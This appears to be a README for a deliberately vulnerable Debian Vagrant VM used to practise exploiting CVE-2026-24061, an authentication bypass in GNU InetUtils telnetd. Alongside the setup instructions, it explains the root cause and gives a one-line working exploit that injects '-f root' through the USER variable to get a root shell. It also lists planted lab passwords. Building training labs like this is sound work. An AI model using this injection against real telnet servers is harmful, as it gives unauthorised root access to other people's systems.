# vuln-deb

A vulnerable Debian-based VM for practising exploitation of **CVE-2026-24061** — a critical authentication bypass in GNU InetUtils `telnetd`.

> ⚠️ **Lab use only**: This VM is intentionally insecure and must only be run in an isolated, offline local environment. Never expose it to a public or shared network.

---

## Vulnerability: CVE-2026-24061

| Property | Detail |
|---|---|
| **Affected software** | GNU InetUtils `telnetd` 1.9.3 – 2.7 |
| **CVSS score** | 9.8 (Critical) |
| **Authentication required** | None |
| **User interaction required** | None |
| **Impact** | Instant root shell |

### Root cause

`telnetd` in the affected versions passes the client-supplied `USER` environment variable directly to `/usr/bin/login` as a command-line argument, without any sanitisation. Because `/usr/bin/login` treats arguments starting with `-f` as a "pre-authenticated" flag, an attacker can inject `-f root` as the username to bypass authentication entirely and obtain a root shell over Telnet — no password required.

### Exploit

```bash
# From your host machine:
USER='-f root' telnet -a 192.168.56.10
```

`-a` tells the Telnet client to send the `USER` environment variable automatically during the Telnet negotiation. The server forwards it verbatim to `login -f root`, skipping password authentication and dropping you into a root shell.

### Lab credentials (planted by the provisioning script)

| Account | Password |
|---|---|
| `student` | `student123` |
| `root` | `toor` |

The flag is at `/root/flag.txt` (readable only by root — retrievable after exploiting CVE-2026-24061).

---

## What this repository provides

- A Vagrant VM based on `debian/bookworm64`
- Private host-only network at `192.168.56.10`
- Automated provisioning script that installs GNU InetUtils 2.7 and configures the vulnerable telnet environment

## Prerequisites

Install the following on your host machine:

- [Vagrant](https://developer.hashicorp.com/vagrant/downloads)
- [VirtualBox](https://www.virtualbox.org/wiki/Downloads)

## Setup and run the VM

From the repository root:

```bash
vagrant up
```

This command will:

- Create the VM
- Run `provision/setup.sh`
- Configure the vulnerable telnet lab environment

## Access the VM

```bash
vagrant ssh
```

## Quick verification

From your host, check that the target is reachable:

```bash
telnet 192.168.56.10 23
```

## Stop, restart, and destroy

```bash
vagrant halt      # stop VM
vagrant reload    # restart VM
vagrant destroy   # delete VM
```
